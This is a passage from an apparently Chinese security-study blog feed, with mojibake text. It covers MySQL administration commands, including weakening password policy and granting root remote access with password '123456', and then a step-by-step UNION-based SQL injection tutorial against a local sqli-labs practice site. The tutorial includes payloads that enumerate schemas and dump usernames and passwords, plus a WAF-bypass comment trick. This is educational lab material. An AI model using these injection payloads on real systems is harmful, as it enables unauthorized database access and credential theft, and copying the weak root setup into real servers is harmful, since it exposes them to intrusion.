privileges;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fy1be78PohEBaL5.png" alt="image-20201112172854469"></p><p>æŸ¥çœ‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where user&#x3D;&#39;wyw&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/D6eKVu1wSGP3IvT.png" alt="image-20201112173201025"></p><p>ï¼ˆ4ï¼‰æ’¤é”€ç”¨æˆ·æƒé™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">revoke some_privileges to *.* from &#39;name&#39;@&#39;host&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/qmYS8la1EuW27iB.png" alt="image-20201112174611837"></p><p>æŸ¥çœ‹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/9MGbYT5ym1ASae3.png" alt="image-20201112174719182"></p><h2 id="åº“ç›¸å…³å‘½ä»¤"><a href="#åº“ç›¸å…³å‘½ä»¤" class="headerlink" title="åº“ç›¸å…³å‘½ä»¤"></a>åº“ç›¸å…³å‘½ä»¤</h2><p>ï¼ˆ1ï¼‰å¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE db_name;</span><br></pre></td></tr></table></figure><hr><p>ï¼ˆ2ï¼‰åˆ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP DATABASE db_name;</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æŸ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW CREATE DATABASE db_name;</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰æ‰“å¼€æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE db_name;</span><br></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰æŸ¥çœ‹å½“å‰æ‰€åœ¨æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATABASE();</span><br></pre></td></tr></table></figure><h2 id="è¡¨ç›¸å…³å‘½ä»¤"><a href="#è¡¨ç›¸å…³å‘½ä»¤" class="headerlink" title="è¡¨ç›¸å…³å‘½ä»¤"></a>è¡¨ç›¸å…³å‘½ä»¤</h2><p>ï¼ˆ1ï¼‰å¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name(</span><br><span class="line">column_name data_type,</span><br><span class="line">......</span><br><span class="line">)[ENGINE&#x3D;MYISAM DEFAULT CHARSET&#x3D;UTF8MB4];</span><br></pre></td></tr></table></figure><p>// []ä¸­å†…å®¹å¯çœç•¥ã€‚</p><p>eg:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE user(</span><br><span class="line">uid INT AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line">username VARCHAR(30) NOT NULL,</span><br><span class="line">pwd CHAR(32) NOT NULL,</span><br><span class="line">pic CHAR(40) NOT NULL DEFAULT &#39;a.jpg&#39;,</span><br><span class="line">money DECIMAL(8,2),</span><br><span class="line">content TEXT,</span><br><span class="line">sex ENUM(&#39;male&#39;,&#39;female&#39;,&#39;secret&#39;),</span><br><span class="line">age TINYINT UNSIGNED NOT NULL DEFAULT &#39;18&#39;</span><br><span class="line">)[ENGINE&#x3D;MYISAM DEFAULT CHARSET&#x3D;UTF8MB4];</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰åˆ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE table_name;</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ”¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tab_name RENAME new_tab_name;</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰æŸ¥</p><p>æŸ¥çœ‹è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES[FROM db_name];</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ•°æ®è¡¨ç»“æ„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESC table_name;   </span><br></pre></td></tr></table></figure><h2 id="å­—æ®µç›¸å…³å‘½ä»¤"><a href="#å­—æ®µç›¸å…³å‘½ä»¤" class="headerlink" title="å­—æ®µç›¸å…³å‘½ä»¤"></a>å­—æ®µç›¸å…³å‘½ä»¤</h2><p>ï¼ˆ1ï¼‰å¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name ADD col_name col_definition[FIRST|AFTER col_name];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name ADD (col_name col_definition,...);</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰åˆ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name DROP col_name;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name DROP col_name,DROP col_name,...;</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ”¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tab_name MODIFY col_name col_definition[FIRST|AFTER col_name];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tab_name CHANGE old_col_name new_col_name col_definition[FIRST|AFTER col_name];</span><br></pre></td></tr></table></figure><h2 id="æ•°æ®ç›¸å…³å‘½ä»¤"><a href="#æ•°æ®ç›¸å…³å‘½ä»¤" class="headerlink" title="æ•°æ®ç›¸å…³å‘½ä»¤"></a>æ•°æ®ç›¸å…³å‘½ä»¤</h2><p>ï¼ˆ1ï¼‰å¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name(column_name,...)</span><br><span class="line">VALUES(&#39;&#39;,&#39;&#39;,...)ï¼Œ(&#39;&#39;,&#39;&#39;,...),...;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name SET col_name&#x3D;expr,...;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name(col_name) SELECT col_name FROM table_reference;</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰åˆ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM table_name [WHERE where_condition];</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ”¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name SET col_name1&#x3D;expr,col_name2&#x3D;expr,...[WHERE where_condition];</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰æŸ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name [WHERE where_condition];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name,... FROM table_name;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœåˆ†ç»„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT col_name FROM table_name GROUP BY col_name;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœæ’åº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT col_name FROM table_name ORDER BY col_name ASC|DESC;</span><br></pre></td></tr></table></figure><p>é™åˆ¶æŸ¥è¯¢ç»“æœè¿”å›æ•°é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name LIMIT row_count;</span><br></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰è¿æ¥</p><p>mysqlåœ¨SELECT,UPDATE,DELETEè¯­å¥ä¸­æ”¯æŒJOINæ“ä½œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_reference INNER|LEFT|RIGHT JOIN table_reference ON conditional_expr</span><br></pre></td></tr></table></figure><h1 id="å¯†ç è®¾ç½®ä¸è¿œç¨‹è¿æ¥"><a href="#å¯†ç è®¾ç½®ä¸è¿œç¨‹è¿æ¥" class="headerlink" title="å¯†ç è®¾ç½®ä¸è¿œç¨‹è¿æ¥"></a>å¯†ç è®¾ç½®ä¸è¿œç¨‹è¿æ¥</h1><h2 id="MySQLä¸­ä¸ºrootç”¨æˆ·è®¾ç½®å¯†ç "><a href="#MySQLä¸­ä¸ºrootç”¨æˆ·è®¾ç½®å¯†ç " class="headerlink" title="MySQLä¸­ä¸ºrootç”¨æˆ·è®¾ç½®å¯†ç "></a>MySQLä¸­ä¸ºrootç”¨æˆ·è®¾ç½®å¯†ç </h2><p>è¿›å…¥mysqlåå‘ç°rootç”¨æˆ·å¯†ç ä¸ºç©º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE mysql;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT host,user,authentication_string FROM user;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/3AYLdpV4iGK6Bzu.png" alt="image-20201101233018450"></p><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è®¾ç½®å¯†ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;æ–°å¯†ç &#39; PASSWORD EXPIRE NEVER;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;æ–°å¯†ç &#39;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure><p>å‡ºç°é”™è¯¯ï¼š</p><p><strong>ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</strong></p><p>æŸ¥æ‰¾èµ„æ–™ï¼š</p><p>åŸå› æ˜¯å› ä¸ºå¯†ç è®¾ç½®çš„è¿‡äºç®€å•ä¼šæŠ¥é”™,MySQLæœ‰å¯†ç è®¾ç½®çš„è§„èŒƒ</p><p>å¦‚æœæƒ³è¦æŸ¥çœ‹MySQLå®Œæ•´çš„åˆå§‹å¯†ç è§„åˆ™,ç™»é™†åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#39;validate_password%&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ZTkVwiKIoWrHGtb.png" alt="image-20201101235231684"></p><p>validate_password.lengthå†³å®šå¯†ç çš„é•¿åº¦,é»˜è®¤é•¿åº¦ä¸º8ä½ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤ä¿®æ”¹ä¸º4ä½ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global validate_password.length&#x3D;4;</span><br></pre></td></tr></table></figure><p>validate_password_policyå†³å®šå¯†ç çš„éªŒè¯ç­–ç•¥,é»˜è®¤ç­‰çº§ä¸ºMEDIUM(ä¸­ç­‰),å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤ä¿®æ”¹ä¸ºLOW(ä½)ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global validate_password.policy&#x3D;0;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å®Œæˆåå¯†ç å°±å¯ä»¥è®¾ç½®çš„å¾ˆç®€å•ã€‚</p><p>å†æ¬¡è®¾ç½®å¯†ç </p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/PeC6lhpZ4gVNJG1.png" alt="image-20201101235825039"></p><p>æˆåŠŸ!</p><p>é€€å‡ºåé‡æ–°ä½¿ç”¨è®¾ç½®çš„å¯†ç è¿›å…¥MySQL</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Q8HoYIWZLOrpGmy.png" alt="image-20201101235949729"></p><p>å†æ¬¡æŸ¥çœ‹ç”¨æˆ·åŠå¯†ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT host,user,authentication_string FROM user;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/VzMwpaEI18cnTbL.png" alt="image-20201102000107053"></p><p>å®Œæˆ!</p><h2 id="Navicatè¿œç¨‹è¿æ¥MySQL"><a href="#Navicatè¿œç¨‹è¿æ¥MySQL" class="headerlink" title="Navicatè¿œç¨‹è¿æ¥MySQL"></a>Navicatè¿œç¨‹è¿æ¥MySQL</h2><p>1)ä¿®æ”¹é…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾åˆ°bind-address,å°†bind-address=127.0.0.1 ä¿®æ”¹ä¸ºbind-address=0.0.0.0 ,ä»¥å…è®¸ä»»ä½•IPæ¥è®¿é—®MySQLæœåŠ¡</p><p>2ï¼‰é‡å¯MySQLæœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure><p>3ï¼‰ç»™éœ€è¦è¿œç¨‹è®¿é—®çš„ç”¨æˆ·æˆæƒ</p><p>æˆæƒæ‰€æœ‰æƒé™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;123456&#39; with grant option;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201118172547045.png" alt="image-20201118172547045"></p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://www.pianshen.com/article/251865160/">Linuxä¸‹é‡ç½®mysql8.0å¯†ç </a></p><p>[2] <a href="https://blog.csdn.net/calistom/article/details/87939956">ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</a></p><p>â€‹                 </p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨å­¦ä¹  </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥åŸºç¡€</title>
      <link href="posts/20316.html"/>
      <url>posts/20316.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>SQLæ³¨å…¥å°±æ˜¯é€šè¿‡æŠŠSQLå‘½ä»¤æ’å…¥åˆ° Webè¡¨å•æäº¤ æˆ– URL æˆ– é¡µé¢è¯·æ±‚ç­‰çš„æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLå‘½ä»¤ã€‚å³ï¼šå°†æ„é€ çš„SQLè¯­å¥æ’å…¥åˆ°æ­£å¸¸æäº¤çš„å­—ç¬¦ä¸²ä¸­ï¼Œå¹¶ä½¿æœåŠ¡å™¨å°†å­—ç¬¦ä¸²ä¸­çš„å‘½ä»¤è§£æä¸ºå¯æ‰§è¡Œå‘½ä»¤è€Œä¸æ˜¯å­—ç¬¦ä¸²ã€‚</p><p>SQLæ³¨å…¥äº§ç”Ÿçš„åŸå› ï¼šè®¸å¤šç½‘é¡µç¨‹åºå‘˜åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™ï¼Œæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„åˆæ³•æ€§è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­å’Œè¿‡æ»¤ï¼Œä»è€Œå¯¼è‡´åº”ç”¨ç¨‹åºå­˜åœ¨è¯¥æ¼æ´ã€‚</p><p>MySQLæ‰‹å·¥æ³¨å…¥åŸç†ï¼šä¸»è¦æ˜¯åˆ©ç”¨mysqlè‡ªå¸¦çš„information_schemaæ•°æ®åº“ï¼Œinformation_schemaè¿™ä¸ªæ•°æ®åº“ä¿å­˜äº†MySQLä¸Šæ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æœ‰å“ªäº›æ•°æ®åº“ã€å„ä¸ªæ•°æ®åº“æœ‰å“ªäº›è¡¨ï¼Œæ¯å¼ è¡¨çš„å­—æ®µç±»å‹æ˜¯ä»€ä¹ˆï¼Œå„ä¸ªæ•°æ®åº“è¦ä»€ä¹ˆæƒé™æ‰èƒ½è®¿é—®ï¼Œç­‰ç­‰ä¿¡æ¯éƒ½ä¿å­˜åœ¨information_schemaæ•°æ®åº“é‡Œé¢ã€‚</p></blockquote><p>SQLæ³¨å…¥ç»ƒä¹ ç¯å¢ƒï¼šSqlilabs</p><p><a href="https://github.com/Rinkish/Sqli_Edited_Version">https://github.com/Rinkish/Sqli_Edited_Version</a></p><h1 id="GET-Unionæ³¨å…¥"><a href="#GET-Unionæ³¨å…¥" class="headerlink" title="GET Unionæ³¨å…¥"></a>GET Unionæ³¨å…¥</h1><h2 id="æ‰‹åŠ¨æµ‹è¯•"><a href="#æ‰‹åŠ¨æµ‹è¯•" class="headerlink" title="æ‰‹åŠ¨æµ‹è¯•"></a>æ‰‹åŠ¨æµ‹è¯•</h2><p><strong>1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹</strong></p><p>é€šè¿‡åœ¨URLä¸­ä¿®æ”¹å¯¹åº”çš„IDå€¼ï¼Œä¸ºæ­£å¸¸æ•°å­—ï¼Œå¤§æ•°å­—ï¼Œå­—ç¬¦ï¼ˆå•å¼•å·ï¼ŒåŒå¼•å·ï¼ŒåŒå•å¼•å·ï¼Œæ‹¬å·ï¼Œåæ–œæ†)æ¥æ¢æµ‹URLä¸­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ã€‚</p><p>åˆ¤æ–­æ³¨å…¥ç±»å‹ï¼š</p><p>æ•°å­—å‹æ³¨å…¥ï¼šid=1 è¿”å›æ­£å¸¸ â€“&gt; id=2-1 è¿”å›æ­£å¸¸</p><p>å­—ç¬¦å‹æ³¨å…¥ï¼šid=1 è¿”å›æ­£å¸¸ â€“&gt; id=1a è¿”å›æ­£å¸¸ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1    #æ­£å¸¸æ˜¾ç¤º</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203101671.png" alt="image-20201130203101671"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;   </span><br><span class="line">&#x2F;&#x2F;æ·»åŠ å•å¼•å·åæŠ¥é”™,çŒœæµ‹sqlè¯­å¥ SELECT * FROM users WHERE id&#x3D;&#39;1&#39;&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231003746.png" alt="image-20201128231003746"></p><p><strong>2.æ·»åŠ æ³¨é‡Šï¼ˆæ·»åŠ çš„å•å¼•å·é—­åˆå‰é¢çš„å•å¼•å·ï¼Œå†ç”¨æ³¨é‡Šç¬¦æ³¨é‡Šæ‰åé¢å†…å®¹ï¼‰</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;--+        </span><br><span class="line">&#x2F;&#x2F;åé¢åŠ ä¸Šand &#39;1&#39;&#x3D;&#39;1 ,or &#39;1&#39;&#x3D;&#39;1 ,and &#39;1&#39; like &#39;1ï¼Œor&#39; &#39;&#x3D;1&#x3D;&#39; äº¦å¯ï¼Œé—­åˆå•å¼•å·</span><br><span class="line">sqlè¯­å¥ SELECT * FROM users WHERE id&#x3D;&#39;1&#39;-- &#39; LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231239638.png" alt="image-20201128231239638"></p><p>æ³¨é‡Šç¬¦ï¼šåœ¨Mysqlä¸­å¸¸è§çš„æ³¨é‡Šç¬¦è¡¨è¾¾å¼ï¼š#(%23) æˆ–â€“ç©º æ ¼æˆ– /**/</p><p>å†…è”æ³¨é‡Šï¼š /*! SQLè¯­å¥ */ åªæœ‰Mysqlå¯ä»¥è¯†åˆ«ï¼Œå¸¸ç”¨æ¥ç»•è¿‡WAF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from articles where id &#x3D; -1 &#x2F;*!union*&#x2F; &#x2F;*!select*&#x2F; 1,2,3,4</span><br></pre></td></tr></table></figure><p><strong>3.åˆ¤æ–­å­—æ®µæ•°é‡(ä½¿ç”¨order by å¯¹å­—æ®µæ’åº)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 1--+  #å¯¹ç¬¬ä¸€åˆ—æ’åºï¼Œæ­£å¸¸</span><br></pre></td></tr></table></figure><p>â€¦â€¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4--+  #å¯¹ç¬¬å››åˆ—æ’åºï¼ŒæŠ¥é”™ï¼Œè¡¨æ˜æ²¡æœ‰ç¬¬å››åˆ—</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231715638.png" alt="image-20201128231715638"></p><p>å³æœ‰3ä¸ªå­—æ®µ</p><p><strong>4.æŠ¥æ˜¾ç¤ºä½ï¼Œidè®¾ä¸ºæŸ¥è¯¢ä¸åˆ°çš„æ•°æ®ï¼ˆä½¿ç”¨unionè”åˆæŸ¥è¯¢ï¼Œå‰åçš„è¡¨ä¸­è¦æœ‰ç›¸åŒçš„å­—æ®µæ•°ï¼Œç„¶åè®©å·¦è¾¹æŸ¥è¯¢æ— ç»“æœï¼Œå³è¾¹æœ‰ç»“æœï¼‰</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128232240296.png" alt="image-20201128232240296"></p><p><strong>5.æŸ¥è¯¢ç›¸å…³ä¿¡æ¯</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,database(),3--+  #æŸ¥è¯¢å½“å‰æ•°æ®åº“</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128233025336.png" alt="image-20201128233025336"></p><p>å…¶ä»–ä¿¡æ¯ user(),version()â€¦</p><p><strong>6.æŸ¥è¯¢å…·ä½“ä¿¡æ¯</strong></p><p>1ï¼‰æŸ¥è¯¢æ‰€æœ‰åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234024839.png" alt="image-20201128234024839"></p><p>2ï¼‰æŸ¥è¯¢å½“å‰åº“çš„æ‰€æœ‰è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234247143.png" alt="image-20201128234247143"></p><p>3ï¼‰æŸ¥è¯¢è¡¨ä¸­å­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;--+</span><br></pre></td></tr></table></figure><p>å¼•å·å†… users è½¬æ¢ä¸ºåå…­è¿›åˆ¶äº¦å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;0x7573657273--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234755093.png" alt="image-20201128234755093"></p><p><strong>7.æŸ¥è¯¢æ•°æ®</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(id,0x3a,password,0x3a,username),3 from users--+</span><br></pre></td></tr></table></figure><p><img 